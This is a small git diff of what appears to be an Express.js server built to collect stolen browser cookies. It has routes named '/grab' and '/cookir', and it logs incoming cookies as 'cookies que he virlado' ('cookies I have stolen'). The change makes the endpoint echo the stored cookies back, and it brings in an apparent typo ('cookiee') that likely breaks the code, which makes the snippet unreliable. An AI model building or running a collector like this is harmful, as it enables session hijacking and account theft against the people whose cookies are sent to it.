@@ -20,9 +20,9 @@ app.get('/grab', (req, res) => {
   
   app.get('/cookir', (req, res) => {
       let cookie = req.query.cookie
-      cokkiesQueGuardo = cookies
+      cokkiesQueGuardo = cookiee
       console.log("Cookies que he virlado:" + cookie)
-      res.send('Hola wuenas tardes')
+      res.send('Hola wuenas tardes, estas cookies estan almacenadas:' + cokkiesQueGuardo)
   
   })
 
